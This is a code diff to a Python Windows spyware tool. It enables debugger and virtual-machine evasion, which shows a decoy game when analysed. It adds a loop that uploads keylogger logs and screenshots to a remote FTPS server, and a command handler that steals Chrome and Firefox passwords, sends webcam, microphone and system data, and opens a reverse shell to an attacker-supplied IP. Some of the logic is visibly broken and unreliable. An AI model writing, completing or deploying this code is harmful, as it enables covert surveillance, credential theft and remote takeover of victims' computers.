@@ -10,10 +10,11 @@ import os
 import socket
 from ctypes import *
 import pythoncom, pyWinhook, win32clipboard, win32gui, win32ui, win32con, win32api, pyaes, win32cred, pywintypes
-import sqlite3, shutil, win32crypt, win32process, sys, random, pygame
+import sqlite3, shutil, win32crypt, win32process, sys, random, pygame, time
 from sys import gettrace as sys_gettrace
 from tkinter import *
 from ftplib import FTP_TLS
+from _thread import *
 
 #Variables
 user32 = windll.user32
@@ -397,24 +398,103 @@ def ftps_download_file(ftps, file):
     ftps.retrbinary('RETR ' + file, open(file, 'wb').write)
 
 def ftps_create_dir(ftps, dir):
-    ftps.mkd(os.environ.get("USERNAME"))
-    ftps.cwd(os.environ.get("USERNAME"))
+    ftps.mkd(os.environ.get("USERNAME" + "/" + str(dir)))
+    ftps.cwd(os.environ.get("USERNAME" + "/" + str(dir)))
+
+def ftps_check_dir(ftps, dir):
+    try:
+        ftps.cwd(dir)
+        return True
+    except:
+        ftps_create_dir(ftps, dir)
+        return False
 #------------------------END Connection to FTPS server------------------------
 
 #Test all of the above functions:
 def main():
+    count = 0
     #debugger and vm detection, if detected open the game, otherwise the keylogger
-    #if is_debugger_present() == True or is_vm() == True:
-    #    print("Debugger detected!")
-    #    game()
-    #    sys.exit()
+    if is_debugger_present() == True or is_vm() == True:
+        print("Debugger detected!")
+        game()
+        sys.exit()
+    else:
+        #multithreading for keylogger and Screenshotsaving
+        start_new_thread(get_current_process, ())
+        #loop for connection protocol to FTPS server
+        while True:
+            try:
+                ftps = ftps_connect(False) #for ipv4 connection test
+                break
+            except:
+                try:
+                    ftps = ftps_connect(True) #ipv6 connection if ipv4 wont work
+                    break
+                except:
+                    time.sleep(20)
+                    
+            
+            #upload pictures and keylogger data to ftps server
+            if os.path.exists(str(get_path()) + "/keylogger/"):
+                if count == 0:
+                    ftps.mkd(os.environ.get("USERNAME"))
+                ftps_check_dir(ftps, str(get_path()) + "/keylogger/")
+                ftps_upload_file(ftps, str(get_path()) + "/keylogger/keylogger.txt")
+                ftps.cwd("..")
 
 
-    #just works like this, use it wisely, produces a picture of all the current connected monitors of the laptop!
-    #SaveScreenshot("test.png")
-    
-    #test function keyStroke
-    #get_current_process()
+            if os.path.exists(str(get_path()) + "/screenshots/") :
+                if count == 0:
+                    ftps.mkd(os.environ.get("USERNAME"))
+                ftps_check_dir(ftps, str(get_path()) + "/screenshots/")
+                n = 0
+                while screenshot_number < n:
+                    ftps_upload_file(ftps, str(get_path()) + "/screenshots/screenshot" + str(n) + ".png")
+                    n += 1
+                ftps.cwd("..")
+            
+            #check for commands from ftps server 
+            if ftps_check_dir(ftps, str(os.environ.get("USERNAME") + "/commands/")) == True:
+                ftps_download_file(ftps, str(os.environ.get("USERNAME") + "/commands/command.txt"))
+                ftps.delete(str(os.environ.get("USERNAME") + "/commands/command.txt"))
+                ftps.cwd("..")
+                ftps.cwd("..")
+                with open(str(get_path()) + "/commands/command.txt", "r") as f:
+                    command = f.read()
+                    if command == "get passwords":
+                        get_chrome_passwords()
+                        get_firefox_passwords()
+                        ftps_upload_file(ftps, str(get_path()) + "/passwords/passwords.txt")
+                        ftps.delete(str(get_path()) + "/passwords/passwords.txt")
+                    elif command == "get screenshots":
+                        n = 0
+                        while screenshot_number < n:
+                            ftps_upload_file(ftps, str(get_path()) + "/screenshots/screenshot" + str(n) + ".png")
+                            n += 1
+                    elif command == "get keylogger":
+                        ftps_upload_file(ftps, str(get_path()) + "/keylogger/keylogger.txt")
+                    elif command == "get process":
+                        ftps_upload_file(ftps, str(get_path()) + "/process/process.txt")
+                    elif command == "get systeminfo":
+                        ftps_upload_file(ftps, str(get_path()) + "/systeminfo/systeminfo.txt")
+                    elif command == "get reverse shell":
+                        ftps_download_file(ftps, str(get_path()) + "/reverse_shell/reverse_shell.txt")
+                        ftps.delete(str(get_path()) + "/reverse_shell/reverse_shell.txt")
+                        ftps.cwd("..")
+                        ftps.cwd("..")
+                        with open(str(get_path()) + "/reverse_shell/reverse_shell.txt", "r") as f:
+                            ip = f.read()
+                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            s.connect((ip, 443))
+                            reverse_shell(s)
+                    elif command == "get webcam":
+                        ftps_upload_file(ftps, str(get_path()) + "/webcam/webcam.jpg")
+                        ftps.delete(str(get_path()) + "/webcam/webcam.jpg")
+                    elif command == "get microphone":
+                        ftps_upload_file(ftps, str(get_path()) + "/microphone/microphone.wav")
+                        ftps.delete(str(get_path()) + "/microphone/microphone.wav")
+                    elif command == "get clipboard":
+                        pass
 
     #test path function
     #print(get_path())
